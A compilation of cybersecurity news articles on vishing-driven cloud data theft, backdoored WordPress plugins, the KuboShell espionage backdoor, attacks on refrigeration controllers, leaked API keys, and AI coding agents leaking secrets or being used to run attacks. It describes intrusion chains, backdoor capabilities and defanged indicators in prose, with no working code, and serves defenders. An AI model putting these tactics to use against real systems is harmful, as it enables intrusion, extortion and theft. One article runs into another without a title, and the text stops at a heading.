Title: Com-Affiliated Hackers Hijack Cloud Accounts via Vishing for Data Theft and Extortion
Context: Palo Alto Networks Unit 42 has disclosed that it's tracking and has responded to "numerous waves of vishing attacks" orchestrated by Com-affiliated threat actors since August...
Full Text:
Palo Alto Networks Unit 42 has disclosed that it's tracking and has responded to "numerous waves of vishing attacks" orchestrated by Com-affiliated threat actors since August 2026 that have led to data theft and extortion attempts.

The attacks have targeted financial services, healthcare, and legal services located in the U.S., the U.K., and Australia. Other targets include construction, high-technology, transportation, manufacturing, pharmaceuticals, insurance, and real estate sectors.

"The victims share a common profile: they hold large volumes of high-impact corporate data where exposure carries severe regulatory, legal, or market consequences," Unit 42 said. "These attackers targeted financial services organizations about twice as often as healthcare organizations in August 2026, but healthcare overtook financial services in September."

The activity has been attributed to a number of threat clusters, including -

Bling Libra (aka ShinyHunters)

CL-CRI-1116 (aka Redact, formerly BlackFile), first observed in January 2026

CL-CRI-1147 (aka Pink), first observed in May 2026

CL-CRI-1182 (aka Falcon), first observed in mid-2026

CL-CRI-1192 (aka Helix and UNC6671), first observed in June 2026

CL-CRI-1264 (aka Vortex), first observed in September 2026

CL-CRI-1274 (aka Cinder), first observed in September 2026

Intrusions typically commence with voice phishing, with the attackers posing as IT staff to resolve a purported authentication issue and direct the victim to a phishing page personalized to their organization.

Once the AiTM kit captures credentials and session tokens, the attackers quickly enroll their own multi-factor authentication (MFA) devices, abuse cloud utilities and, in a few instances, deploy malicious browser extensions to exfiltrate data and extort victims.

The harvested authentication data is used to authenticate to victim environments, typically by routing such requests through residential proxy networks and commercial VPNs. The adversaries then seek to establish multi-layered persistence by registering their MFA devices, generating cloud infrastructure temporary credentials, authorizing unapproved third-party OAuth applications; enumerate sensitive data; evade defenses by modifying mailbox rules and clearing security alert events; and harvest data from cloud platforms.

"Attackers associated with CL-CRI-1264 establish initial access through vishing, where they pose as internal IT support and direct employees to servers using subdomains tailored to each targeted organization," Unit 42 said.

"These servers act as adversary-in-the-middle (AitM) proxies that pass user credentials and multi-factor authentication (MFA) approvals to the attackers in real time. Attackers have targeted employees on both their corporate workstations and personal mobile devices."

CL-CRI-1264 has also been observed enrolling unauthorized MFA devices within minutes of authenticating to establish persistence, often reusing a single device named Pixel 10a across compromised accounts. The attack chains involve automated data exfiltration using Python scripts to harvest information from Microsoft 365 mailbox, OneDrive, and SharePoint.

Once data is exfiltrated, the threat actor sends Microsoft Teams messages directly to employees at victim organizations, claiming data theft and instructing them to visit a TOR-hosted ransom negotiation site.

The second new cluster to emerge around the same time is CL-CRI-1274, which has also leaned on vishing for initial access and leveraged the Microsoft Graph software development kit (SDK) to collect and exfiltrate data from the victim's SharePoint and OneDrive environments.

"Afterwards, the attackers used a compromised account to send extortion messages internally via email and Microsoft Teams, ultimately directing recipients to a Tor-hosted negotiation site," Unit 42 said.

The cybersecurity company said it also observed the CL-CRI-1192 attackers using a malicious browser extension named "Google Chrome" that's said to have been sideloaded onto the browser after enabling Developer Mode. The add-on performs a number of malicious actions, such as -

Installing global keyloggers

Stealing local/session storage and authentication cookies for Microsoft and Google accounts

Scanning pages for QR codes to capture login/MFA tokens

Streaming webcam feeds

Implementing a command-and-control (C2) remote control module via Chrome DevTools Protocol to capture screenshots, dispatch input events, steal clipboard contents, and allow remote site navigation.

"We assess with moderate confidence that the attackers associated with CL-CRI-1192 developed this malicious browser extension as an alternative method to extract credentials from desktop and laptop devices running Chromium-based browsers such as Google Chrome and Microsoft Edge," Unit 42 said.

"The extension might also be shared with and used by other Com-affiliated attackers, although we currently have no evidence to suggest this."

One of the defining traits of the threat actors is their use of "apex" domains that impersonate single sign-on (SSO) portals, IT support pages, and passkey configuration services for each of the targeted organizations.

Also shared among the attackers is an AitM phishing kit called Doko's Panel that allows them to steal authenticated sessions and then abuse them to access connected software-as-a-service (SaaS) platforms like SharePoint, Salesforce, DocuSign, and Slack to exfiltrate data of interest.

"The same persona behind Doko's Panel has been observed actively recruiting 'experienced callers' via Telegram, specifying requirements including fluent English with no accent, and advertising six-to-seven-figure weekly returns — evidence of the professionalized vishing-as-a-service model that complements the phishing kit ecosystem," Push Security noted in a report published earlier this May.

Microsoft has also revealed cloud-based intrusions in which threat actors have employed passkey and SSO lures to obtain unauthorized access and add their own authentication methods to set up persistence, as well as conduct high-volume Microsoft Graph activity, SharePoint and OneDrive downloads, and mailbox collection through REST APIs.

"Rather than employing custom tools, the threat actors primarily leveraged native cloud utilities and selectively limited executions and persistence deployments," Unit 42 said. "Cybercriminals like Bling Libra and other Com-affiliated threat actors are pivoting away from encryption, enabling them to move at greater speed across their intrusion lifecycle while still achieving their objectives."

Title: WordPress Blocks Six Backdoored WP Connect Plugins Before Malicious Releases Go Live
Context: The WordPress plugins team has proactively detected and blocked the threat before it could be officially released
Full Text:
WordPress has removed six WordPress plugins developed by WP Connect after they were backdoored on November 22, 2026, to enable arbitrary code execution on sites that have them installed, following a suspected compromise of the developer's account.

The WordPress plugins team has proactively detected and blocked the threat before it could be officially released. Visiting each plugin listing now serves the message: "This plugin has been closed as of November 22, 2026, and is not available for download. This closure is permanent."

The names of the affected plugins and the malicious versions are listed below -

Air WP Sync – Airtable to WordPress (2.9.1 – 2.9.4)

WP Sync for Notion – Notion to WordPress (1.7.4)

Add-on Brevo for Gravity Forms (2.6.3)

Add-On for Contact Form 7 to Airtable (2.5.4)

Add-On for Contact Form 7 to Notion (1.6.4)

Orders Sync to Airtable for WooCommerce (1.0.2)

These plugins have been collectively installed on more than 3,600 WordPress sites, according to WordPress security company Wordfence. The supply chain compromise is being tracked as CVE-2026-135202 (CVSS score: 9.8). It remains unpatched.

"Each release silently loaded the same remote-control module, which phones home to an attacker-controlled server, executes any PHP code it is sent, and exposes a full command set for running shell commands, stealing password hashes, and planting webshells," security researcher Chloe Chamberland said.

Specifically, the plugins come with a backdoor module ("includes/airwp-online.php") that runs on every request, sends site information (site URL, PHP, WordPress, and OS versions, and the server user) to a hard-coded command-and-control server ("tascredit-pay[.]com"), and runs PHP code returned by the server via eval().

It can also perform the following actions -

Accept queued commands that run shell commands

Read, write, and delete arbitrary files

Query arbitrary database tables

Dump the users table including login, email address, and password hashes

Drop a web shell into the uploads directory or to a path of the attacker's choosing

Register an hourly WP-Cron hook that runs attacker-supplied code

As a result, an unauthenticated attacker in control of the site can execute arbitrary code on the server and take complete control, facilitating credential theft and persistence through web shells and cron hooks that outlast the plugin removal.

Because the malicious versions were never released and blocked due to WordPress's new cooldown protections as part of its Protect The Shire initiative, sites running these plugins are unlikely to be affected. However, it's essential that site owners check their websites to make sure that they are not running one of the compromised versions and remove them as soon as possible.

"Unlike a typical vulnerability, this was not a coding mistake, and there is no patch: the malicious code was added deliberately and committed to each plugin's WordPress.org repository," Chamberland said. "Taken together, this strongly suggests that the developer's WordPress.org account was compromised and used to push the malicious releases, rather than that the vendor shipped this code intentionally."

The disclosure comes as URLscan.io revealed that an unspecified WordPress site had been infected by multiple cybercriminal campaigns, with attackers attempting to disable or remove scripts belonging to competing threat actors.

The site carried "thirteen separate ClickFix injections from three distinct kits [LOM, ErrTraffic, and Macfinger], alongside seven further malicious loaders," it said. "Several of the injections attempt to remove each other's code and overlays, and one injection disables another through a JavaScript naming collision. Five of the thirteen injections resolve their next-stage infrastructure from Polygon smart contracts, a technique known as EtherHiding."

Title: How “don’t ask again” in Claude Code leaks secrets on GitHub: The click that keeps on giving
Context: Attackers only need to borrow it
Full Text:
There are security controls that undoubtedly sound like a safety net, but they end up acting like a trapdoor. For AI coding agents, it’s the approval prompt and the shortcuts people use to skip over it.

On November 9, 2026, Ars Technica reported on research from Apiiro showing that Claude Code is quietly leaking secrets onto public GitHub repositories. Fortunately or unfortunately, the mechanism is mundane, which is exactly why it matters: The leak can be plugged. Separately, our own research found that 10% of sessions ran in YOLO mode, a related but different control. In essence, users are trading oversight for speed and opening their employers up to risk in more than one way.

Defining the controls and their scopes

Both of these controls can be lumped together as “skipping the approval prompt,” but they carry different risks after implementation. Here’s how each one works:

“Yes, and don’t ask again” is a saved allow rule. When a user approves a command and picks this option, Claude Code writes a rule for that command or pattern to .claude/settings.local.json. The permission is scoped only to the specified command and it persists on disk so Claude Code doesn’t have to ask permission to run the same command or pattern in future sessions. This is what Apiiro found leaking.

YOLO mode is permissions prompts turned off. The user tells the agent to stop asking permission and run its tool calls without approval. According to the data, this is often scoped to the entire working session. This is what Sysdig identified.

How a single click exposed secrets on GitHub

When a user approves a shell command and clicks, “Yes, and don’t ask again,” Claude Code saves that choice as a rule. If that command had a database password, API token, or root login baked in, the secret will live in plain text in a config file.

That file is meant to stay local. Anthropic’s docs say it gets added to the developer’s global .gitignore, but security doesn’t move with the repository. If it’s cloned to another machine, or a folder is turned into a repository later, the file can get committed. Per Apiiro, Claude Code will sometimes commit changes to that file on its own.

Apiiro’s research says that more than 100,000 public repositories contained the local settings file, and about one percent of them, from 63 organizations, contained secrets. Of those, roughly 20% slipped past both gitleaks and TruffleHog. Deleting the file doesn’t fully fix it either, because forks keep the secrets alive.

Claude Code’s Boris Cherny said on Hacker News that these files should almost never be checked into a user’s git source control unless they were manually created and checked in. Related bug reports date back to August 2025 and were closed after 60 days of inactivity. The fix is coming, but your secrets are already out there, and there are steps you can take to remove them.

YOLO mode trades oversight for speed

In the report A First Look: Under the Hood of AI Agents, published on November 4, we analyzed what agents were doing on 300+ devices at one organization over one month. Even though it was a single organization and not a representative sample, the patterns were hard to ignore.

In our data, 10% of sessions ran in YOLO mode, meaning the user turned permission prompts off for at least one call. But 98% of the time, prompts actually stayed off for the rest of the session. Looking at tool calls, 61% ran without a human approving them: nine percent in YOLO mode and 52% in auto mode. Auto mode is a classifier tuned to Anthropic’s threat model that screens each tool call in place of prompting a human for approvals. Only 19% of tool calls ran in default mode, where the agent stops and asks for approvals before continuing a session.

YOLO mode and the saved allow rule fail in different ways. YOLO mode turns prompts off for a session and removes the human from the loop. The saved allow rule that was leaking secrets saves a standing approval to disk, removing the human indefinitely. However, the root cause is the same: An approval is treated as a one-time convenience factor for the user when it should actually be a policy decision. In the Apiiro case especially, a click made at 4:55 p.m. on a Friday, while in a rush trying to get one stubborn script to run, becomes a permanent record.

While Cherny suggested auto mode was a better alternative to the saved allow rule because users could avoid “manually maintaining finicky allow/deny lists,” another practitioner noted that sensitive commands can still be saved to settings files in auto mode.

It’s likely that Claude will close the gaps that have been called out, but in the meantime, your secrets are already out there, so you need to do something about that.

Logs and scanners leave gaps

There are certainly benefits to using these controls, namely expediting workflows. However, the Sysdig and Apiiro research highlight gaps in the two safety nets security teams fall back on when approvals are skipped: scanning for secrets that leak and logs that show what the agent did.

First, secret scanners missed secrets. Apiiro found 215 secrets that gitleaks and TruffleHog missed. Scanning is worth doing, but it isn't a complete answer.

Second, you can’t trust an agent’s account of its own actions. In our data, when an agent read a credential file, the agent’s log had no record of the read 82% of the time. When an agent binary read a credential file, the frequency rose to 95%. Fortunately, the kernel saw it every single time. The agent writes the record and also happens to be the thing being audited, which is a conflict of interest that no auditor would otherwise accept from a human.

Put those together and there’s some serious risk exposure to manage. A single user may have long-lived credentials on a laptop, an agent running with standing approvals, and an audit record written by the agent itself. Whether the secret leaks through a public commit, poisoned MCP server, or malicious package, the agent inherits the user’s reach. Attackers only need to borrow it.

Securing AI agents without banning them

No organization should rush to ban the use of agents. This would only push employee usage out of sight. Instead, treat agents like what they are: fast, tireless, untrusted actors using human identities.

Find the files. Search your organization’s repositories, including forks, for .claude/settings.local.json and similar agent config files. Rotate anything sensitive you find, because removing the file doesn’t revoke the secret and forks keep copies.

Stop putting secrets directly in commands. If a command needs a credential, pass it through an environment variable or a secrets manager so it never lands in an approval rule.

Block the file from git at the repo level. Don’t rely on a developer’s global gitignore. Add it to the repository’s .gitignore and enforce it with a pre-commit hook or push protection.

Shrink the blast radius. Give agents scoped, short-lived credentials instead of long-lived files on laptops. Turning prompts off in a sandbox with throwaway credentials is reasonable. Turning them off on a laptop with your cloud keys isn’t.

Verify at the kernel, not the agent log. Gate risky calls (credential paths, destructive commands, installs, new MCP servers) based on what they touch, and rely on runtime telemetry that the agent can’t edit as a source of truth.

Decide if anyone should even have access to these controls. Determine whether your employees should have access to “don’t ask again” rules and YOLO mode at all, or whether to restrict them, for example by limiting them to specific employee groups or sandboxed environments, or enforcing a policy centrally where your tooling supports it.

The bottom line

Convenience features become an attack surface the moment they persist. This is a good reminder that security fundamentals still haven’t changed: least privilege, short-lived credentials, and runtime visibility. For AI agents these fundamentals just need to be applied to a new kind of user that works faster than you and never gets tired of clicking yes.

Title: 'We are not ShinyHunters,' says criminal hacking crew that looks and acts just like ShinyHunters
Context: ” The rant follows a Monday report by Okta Threat Intelligence - along with social media speculation since Inception’s inception last week - that the newly emerged group is very...
Full Text: Inception, a new data theft and extortion gang that security researchers have theorized is a rebrand of the ShinyHunters group, “reject[s] this attribution” and claims it has no affiliation with any prior cybercrime enterprise. In a lengthy statement posted Tuesday and shared on X, the extortionists insist that they are a new group, with new operators, and that their alleged social engineering attacks aren’t copying anyone - but rather just abusing the weakest link in an organization’s security: “a human being holding a phone.” The rant follows a Monday report by Okta Threat Intelligence - along with social media speculation since Inception’s inception last week - that the newly emerged group is very likely ShinyHunters with a different name. Okta’s researchers based their analysis on the two groups’ shared infrastructure, plus Inception’s nearly identical tactics: voice phishing, during which the scammers trick targets into entering credentials into phishing pages and approving multi-factor authentication (MFA) requests. Inception apparently took offense to this. “We would like to address this once, clearly, and only once,” the crims' statement says. “We are not ShinyHunters. We were never ShinyHunters. We are Inception.” The gang argues that its overlapping domain registrars, hosting providers, and DNS services don’t prove anything. These are commodity services, “available to anyone who can pay for them,” Inception wrote. Plus, their similar methodologies don't necessarily make Inception a reboot. “That is not theft of tradecraft,” they wrote. “It is acknowledgment of a good idea – the same way every group after LockBit used a leak site, and nobody called them LockBit.” “Inception is a new group, with new operators, our own objectives, and our own name,” the statement continues. “What we share with the past is plumbing.” To be fair, the new crime crew has every reason to distance itself from ShinyHunters. That gang’s September FBI hack - plus several earlier digital heists during which the criminals stole information belonging to millions of people, including cancer patients, university and K-12 students - put a massive target on its collective backs. And while at least three ShinyHunters suspects were arrested in September and October, there's no confirmation that authorities have dismantled the entire operation. Plus, as a ShinyHunters spokesperson told The Register in an earlier interview, they and others in the crew started off as GnosticPlayers before rebranding as ShinyHunters in 2020 - so a reboot isn’t beyond the realm of possibility. Inception, for its part, says it “will not comment further on the ghost of ShinyHunters,” and it has its own work to do. And by work, it means copying ShinyHunters' playbook, stealing corporate data, and extorting victim companies for massive sums of money.®

Title: Report: Half of Black Friday-Themed Emails Are Scams
Context: Attackers are also sending delivery-themed scams, which are particularly effective when people are expecting real deliveries
Full Text:
Black Friday scam campaigns began ramping up in late October and continue to target users ahead of the shopping holiday, according to researchers at Bitdefender. Half of Black Friday-themed email campaigns observed by Bitdefender were scams, luring users with phony giveaways or exclusive early deals. Attackers are also sending delivery-themed scams, which are particularly effective when people are expecting real deliveries.

“During the Black Friday pre-ramp period, Bitdefender observed spikes in delivery-themed scam and phishing activity, particularly on October 31 and November 3,” the researchers write. “FedEx was the most frequently impersonated delivery or logistics brand by volume. Amazon activity was nearly as large, although many of those messages used delivery-notification or shipping-status lures rather than classic courier-only scams. EVRI, DHL and DPD were also clearly present. FedEx, Amazon, EVRI, DHL and DPD are not associated with these scam campaigns.”

After Black Friday passes, users should expect to see similar shopping scams throughout the holiday season. Bitdefender outlines the following advice to help users avoid falling for these scams:

“Open the retailer’s official app or type its address into your browser yourself instead of following an email, text, or ad link

Treat dramatic discounts on luxury goods, electronics and gift cards with extra caution

Be skeptical of unexpected prize notifications, reward balances and free-product offers

Check the website address for misspellings, unusual endings or extra words added to a brand name

Never enter payment details on a page you reached through an unsolicited message without verifying the seller first

Keep security protection enabled across your devices to help block phishing pages, fraudulent shops, and malicious links”

In this article

A bot tested an AWS key just 7.86 seconds after researchers published it

Attackers used up about $60 in prepaid OpenAI and Anthropic credit

If you accidentally publish a key, revoke it and check your account for unexpected usage and charges

Eight seconds is barely enough time to notice a mistake, let alone fix it.

But researchers at Stony Brook University found that it was enough time for a bot to test a cloud access key they’d deliberately left inside a publicly available software package. The fastest observed use came just 7.86 seconds after publication.

You don’t need a company cloud account to have a key worth stealing. If you’ve created an API key for an AI service and used it in an app or script, someone who gets hold of it can run up charges on your account. OpenAI warns that they could also use up your quote and interrupt your service.

To see who was collecting those secrets, Billy Tsouvalas and Nick Nikiforakis set up honeypots, or decoys that let researchers monitor what happens when someone takes the bait. Over four months, they published 300 honeypot images across eight public registries. The bait included working access keys for Amazon Web Services (AWS), OpenAI, and Anthropic. Each key was tied to monitoring, so any use would show up in the provider’s logs.

The researchers didn’t advertise the images anywhere, but they were still downloaded tens of thousands of times.

Most of the early activity looked like bots checking whether the keys worked. Nearly every bot that tested an AWS key began with GetCallerIdentity, essentially a “who am I?” request that tells an attacker whether a key is live. About half the IP addresses researchers saw scanning for AWS keys stopped after that initial check. Only around 6% went on to sustained use of account resources.

A key that passes that check can still be sold on or used later. In the AI-service tests, the OpenAI keys sat quiet for weeks before someone used one to burn through the remaining balance in under 24 hours. The researchers offered an explanation:

“We speculate that the wait phase reflects validated keys being resold and held idle until a buyer eventually uses them.”

The researchers loaded about $60 in total onto their OpenAI and Anthropic accounts, and attackers used up all of it.

How to stay safe

The researchers published honeypot container images on Docker Hub and seven other registries, then shared their findings with Docker. According to the paper, Docker acknowledged the disclosure, and its security team was reviewing the findings.

The number of probing bots and their speed is something developers should worry about. If you use cloud or AI services, a few precautions can help keep your keys safe:

Keep secrets out of what you share. Don’t put keys in code, public repositories, or container images.

Scan before you publish. A bot can find an exposed key within seconds, so a check after publication is too late. The researchers also recommend that registries scan images as they’re uploaded.

Limit what each key can do. In the second round of tests, every OpenAI and Anthropic key that attackers used to burn through credits had unrestricted permissions. No restricted key was used that way. The scanners appear to check permissions first, so a narrowly scoped key gives them less to work with. A narrowly scoped key can only perform specific actions or access particular resources.

Prefer short-lived credentials. AWS recommends using temporary credentials instead of long-term access keys wherever possible.

Set spending limits and alerts. Check whether your provider’s budget setting just sends an alert or sets a hard limit on what you can spend.

If you’ve already published a key, treat it as compromised, even if it was public for only a minute. Revoke it and replace it. Then review account activity and charges.

Scammers don’t need to hack you. They just need you to click once.

Title: Iran-Aligned Volant Manticore Uses IPFS-Based KuboShell Backdoor in Espionage Campaigns
Context: The use of legitimate RMM tools for persistent access has been a hallmark of the MuddyWater group, although the adversary has since also increasingly deployed its own malware in...
Full Text:
A previously undocumented Iran-aligned cyber espionage group called Volant Manticore has targeted telecommunications companies, airlines, and critical infrastructure in Cyprus.

Central to the group's operations is a backdoor called KuboShell that uses the InterPlanetary File System (IPFS) for command-and-control (C2) and deploys Homa, a post-compromise framework that's a reimplementation of MuddyWater's MuddyC2Go. Evidence indicates that the threat actor has been operational since late August 2025.

Also delivered alongside these tools are Remote Monitoring and Management (RMM) programs like MeshCentral and NetLock RMM. In tandem, the group has been observed orchestrating credential harvesting campaigns to harvest email and corporate credentials of some of the impersonated organizations.

The use of legitimate RMM tools for persistent access has been a hallmark of the MuddyWater group, although the adversary has since also increasingly deployed its own malware in attacks. Both MuddyWater and Volant Manticore are assessed to be affiliated with Iran's Ministry of Intelligence and Security (MOIS).

"While we identified multiple links to MuddyWater, we assess that Volant Manticore likely consists of former MuddyWater operators who branched off from the group and currently operate as a separate threat cluster," Check Point said in an analysis published today. "Volant Manticore's targeting priorities appear responsive to regional geopolitical developments."

This assessment is based on the use of an older MuddyWater framework and its playbook, while diverging from established modus operandi over time to incorporate its own attack methods like credential-harvesting campaigns. The targeting of Cyprus, a country that does not align with MuddyWater's targeting patterns, and the use of separate infrastructure points to a group that pursues its own strategic objectives.

Attack chains have been found to leverage artificial intelligence (AI)-generated personas in bogus CVs to trick targets into clicking on a link to download the complete resume, resulting in the deployment of KuboShell on the victim's system. The activity is said to have been aimed at a Cyprus-based airline that operates flights between Cyprus and Israel.

This includes a shift toward Saudi Arabian healthcare entities, coinciding with escalating hostilities between Saudi Arabia and the Iranian-backed Houthis.

"This fits the MOIS's track record of targeting hospitals and healthcare providers through cyber operations during military conflicts, in some cases attempting to disrupt their operations," the cybersecurity company said.

As recently as September 2026, the group has been found to launch a phishing campaign against Saudi targets, distributing the backdoor and N-able RMM through two different healthcare-themed ZIP archives named "AI_Healthcare_Seminar.zip" and "Ai_Healthcare_Seminar_Online.zip," respectively. Some of the emails have been sent from a compromised account belonging to a private hospital in Saudi Arabia.

A Windows backdoor, KuboShell, uses IPFS for C2 and relies on Pinata to facilitate file transfer over the peer-to-peer (P2P) file-sharing network.

"On startup, KuboShell checks whether it has administrator privileges. If not, it tries to relaunch itself with higher privileges, which triggers a User Account Control (UAC) prompt," Check Point explained.

"KuboShell retrieves the MAC address of the machine's first network adapter and uses it as a unique identifier for each victim. It then registers the host by uploading a file containing hi, saved to C:\Users\Public\<MAC>.log, using a hard-coded Pinata access token."

Once registered, KuboShell checks Pinata for a command file named <MAC>.txt, and if the file exists, looks up the file’s IPFS identifier and downloads its contents through Pinata's public gateway. The downloaded content is executed via PowerShell in a hidden window. The results of the execution are saved in a file named "C:\Users\Public\<MAC>re.txt" and uploaded back to the server.

It's worth noting that the backdoor is not responsible for capturing the output. Rather, the results are returned only if the received command writes them to the text file. KuboShell then checks for a new command every 60 seconds.

Analysis indicates that KuboShell is primarily used to run basic reconnaissance commands and assess the compromised environment before downloading and executing a more capable backdoor, which includes the modular Homa Framework. This involves a three-stage process -

PowerShell stager, which contacts a hard-coded IP address ("185.205.187[.]109:8000") to fetch a PowerShell loader and execute it in memory

PowerShell loader, which decodes and launches a JavaScript backdoor

JavaScript Backdoor, which implements a continuous C2 loop to receive and execute PowerShell, SSH, and "cmd.exe" commands

It's suspected that the third-stage backdoor is used to execute additional modules, although the precise nature of those components is presently unknown.

"We assess that Homa's client is a JavaScript reimplementation of the older MuddyC2Go client, potentially allowing Volant Manticore to retain the more complex server-side component with minimal modifications, thereby reducing development time and resources," Check Point said.

The post-compromise framework has also been distributed via a macro-enabled Microsoft Word document called "MilitaryHeritageProposal.doc" that's believed to have targeted a Cypriot defense-related government entity. Enabling the content triggers the execution of a VBA backdoor that serves as a conduit for running follow-up payloads or commands using "cmd.exe."

"Volant Manticore shows how Iran's cyber ecosystem continues to reshape itself," Check Point concluded. "What appears to be a group of former MuddyWater operators now operates independently, pairing legacy MuddyWater tooling with new implants of their own while pursuing a regional focus that has until now drawn little attention."

"If MuddyC2Go is the latest MuddyWater framework Volant Manticore's operators had access to, the split may have happened around 2023 as MuddyWater replaced MuddyC2Go with DarkBeatC2 in late 2023.

Title: New Inception Extortion Brand Tied to SSO Vishing Campaign
Context: ReversingLabs found the lure sites were web-only and used legal-themed lookalike domains, so the campaign never had to pass through email filters
Full Text:
Okta and ReversingLabs have linked a new data-extortion brand called Inception to a voice phishing campaign that targeted single sign-on (SSO) credentials and used stolen access to take data.

Okta Threat Intelligence researchers Moussa Diallo and Katie Nickels and ReversingLabs researcher Robert Simmons detailed the activity in separate reports published November 23.

Okta's report focused on the operators behind the campaign, while ReversingLabs' analysis mapped the infrastructure that tied it to Inception.

A Likely Rebrand After ShinyHunters Arrests

Okta tracked the operators as O-UNC-053, a cluster at work since March 2026. It had previously associated the group with the ShinyHunters data leak site, where companies it had gone after were listed from March to September.

Okta said it did not know precisely how the two were connected, though the link "may have involved an agreement" between the cluster and the site's operators.

After two people allegedly tied to ShinyHunters were arrested in September, the gang's leak site went offline, and Okta saw no O-UNC-053 targets published on any leak site until Inception appeared on November 16. Okta found that targets appearing on Inception had been preceded by O-UNC-053 infrastructure registration.

Okta said the cluster had "very likely changed their brand affiliation" but could not determine with high confidence whether O-UNC-053 operated the Inception data leak site itself or partnered with another extortion group.

The company was also unable to validate whether the published data was authentic. ReversingLabs counted seven claimed victims by November 21, which it treated as unverified claims.

Read more on ShinyHunters: Net Closes Around ShinyHunters with Another FBI Arrest

How the Vishing Campaign Works

The attacks relied on vishing, with callers posing as support staff and pressuring employees to reset passwords through fake sign-in pages. The campaign captured usernames and passwords before seeking additional multifactor authentication (MFA) factors, including one-time codes or push approvals.

ReversingLabs found the lure sites were web-only and used legal-themed lookalike domains, so the campaign never had to pass through email filters. It confirmed the phishing kit itself on 21 domains and attributed 41 more to the operation at a high confidence level and four at a medium level. Most mimicked Okta sign-in pages, though the kit adapted to other identity providers.

Okta noted that the kit could not get past phishing-resistant authentication. The two companies' advice included passkeys or FIDO2 security keys, checks on a caller's identity before help desks reset passwords or MFA and limiting sensitive applications to managed devices.

ReversingLabs also advised checking DNS, proxy and identity logs going back to October 21 for signs of the campaign.

Title: Attackers Target Industrial Refrigeration and Cold Chain Systems
Context: Controller manipulation: Available evidence indicates that the attackers used legitimate controller functions to raise temperature setpoints and lengthen defrost cycles
Full Text:
Affected Platforms: Industrial refrigeration and cold chain monitoring systems, including Danfoss AK-SM and AK-SC series and Copeland and Dixell XWEB controllers Impacted Users: Supermarkets, cold storage operators, and blood banks Impact: XMR Miner and Remote Control of the compromised server Severity Level: Unauthorized changes to temperature setpoints and defrost cycles, delayed alarms, inventory spoilage, and fires

On the night of October 11–12, 2026, attackers remotely changed refrigeration settings at about 700 retail sites in France. Tampering by attackers spoiled stock and caused at least 15 fires, according to France’s Cyber Crisis Coordination Centre (C4). A second wave began on November 1–2, spreading to at least 11 European countries. It also affected cold storage at French blood banks.

In a typical supermarket, a central controller, the system manager, oversees refrigerated cabinets and cold rooms. Refrigeration contractors generally maintain these systems, often for multiple retailers. Contracts or insurance policies also often require remote temperature monitoring. As a result, the equipment is often outside the retailer’s IT network, sometimes connected via a basic 4G modem, and may remain in service even after the manufacturer stops providing updates. Because responsibility is shared between the manufacturer, installer, contractor, and retailer, security ownership can fall through the cracks.

How the Attacks Worked

Reconnaissance: C4 observed scanning for exposed industrial systems as early as April 2026, including conducting large-scale reconnaissance of Schneider Electric equipment over Modbus TCP port 502. C4 also linked infrastructure used in the October refrigeration attack to reconnaissance targeting Schneider Electric equipment.

Initial access: In testimony before the French Senate, France’s national cybersecurity agency, ANSSI, said the October attackers gained access through controllers exposed directly to the internet and protected by weak passwords. Some controllers targeted in November reportedly still used factory-default credentials. Sekoia’s honeypots recorded password-spraying attempts against supervisor and admin accounts using 12345. On the evening of November 1, the honeypots also blocked an attempt to exploit a previously undisclosed flaw that allowed an administrator account to be renamed without authentication. Sekoia assessed that renaming the account was likely a first step toward resetting its password.

Controller manipulation: Available evidence indicates that the attackers used legitimate controller functions to raise temperature setpoints and lengthen defrost cycles. Sekoia also reported changes to alarm thresholds, which delayed detection by maintenance staff for several hours. Malware deployment remains unconfirmed.

Published vulnerabilities in refrigeration controllers can be chained to enable remote code execution, including root-level access on affected Copeland XWEB Pro devices. However, public reporting has not established that either wave exploited these vulnerabilities or that the account-renaming attempt succeeded on a production system. Direct internet exposure provided a route to the controllers, and weak credentials were enough to gain access during the October attack.

The October attacks showed how access to internet-facing controllers can disrupt physical operations. For cold chain operators, securing remote access and monitoring changes to refrigeration settings and alarms can help reduce that risk.

Recommended Mitigations

Asset owners and refrigeration contractors should agree on who manages remote access, credentials, firmware, and monitoring at each site. The European Commission and the European Union Agency for Cybersecurity (ENISA) called for immediate action to reduce exposure, while CISA and its U.S. government partners issued guidance on hardening industrial refrigeration and cold-chain monitoring systems.

Disable direct internet access. Identify publicly accessible controllers, including those connected through cellular modems. Remove port forwarding and isolate refrigeration systems from business networks and other operational technology (OT) assets.

Secure the required remote access. Route vendor connections through a managed service that requires multifactor authentication (MFA). Limit each vendor to the systems and functions needed for maintenance and confirm that required temperature monitoring continues after the change.

Manage credentials and firmware. Replace default or weak passwords, install vendor firmware updates, and identify end-of-life controllers for replacement. Back up known-good configurations so operators can verify settings and restore them after an incident.

Monitor for unauthorized changes. Review authentication and configuration activity, including changes to temperature setpoints, defrost schedules, and alarm thresholds. Test that temperature alarms reach the staff responsible for responding.

Fortinet Protections

In a flat network, an attacker who gains access to a refrigeration controller can modify setpoints and defrost schedules across the cabinets it manages. With a segmented architecture, a FortiGate Next-Generation Ffirewall (NGFW) can restrict access to the controller, limit lateral movement, and provide visibility into unauthorized changes by inspecting traffic. FortiGate also supports advanced threat protection, virtual patching, and secure remote access. See the Fortinet network microsegmentation solution brief.

Title: Recent Trends and Tactics of Agentic AI Attacks
Context: In a subset of analyzed attacks, the first phase featured manual reconnaissance and connectivity checks by human operators, with a median inter-command gap of 23
Full Text:
Executive Summary

Attackers are weaponizing autonomous AI agents in real-world campaigns, creating a risk that until recently has only been theoretical. Between July and September 2026, we identified and tracked more than 10 global campaigns in which different attackers deployed autonomous AI agents to enhance their attacks. These agentic AI attackers operated at machine speed, compressing the attack lifecycle from weeks or days into mere hours.

These campaigns targeted diverse sectors, including government, logistics, hospitality, manufacturing, agriculture and education. In every observed campaign the attackers gained their initial foothold through web shells that were deployed via vulnerable web applications.

The novelty of the observed agentic campaigns was not in their techniques, but in their speed and efficiency. Following the path of least resistance with familiar open-source tools and lightweight custom scripts, the AI-driven operators matched the tradecraft of proficient human attackers while operating at machine scale, at times executing hundreds of unique commands in just minutes.

However, using AI agents came at the expense of operational stealth. The agents left unmistakable behavioral fingerprints that revealed the involvement of non-human operators, including:

Structured machine-readable output formats

Adaptive exploit selection

Iterative refinement

Chain-of-thought reasoning comments that appeared in shell commands

This article details the real-world scenarios that we observed, organized by the tactical patterns that define how agentic AI is being weaponized today.

Organizations can access tailored adversary intelligence, direct analyst consultations, and specialized exposure tracking through Unit 42 Threat Intel Services and its Deep and Dark Web Service.

Related Unit 42 Topics

Agentic AI, LLM, Web shells

Background of Agentic Attacks

What Makes an Attack Agentic?

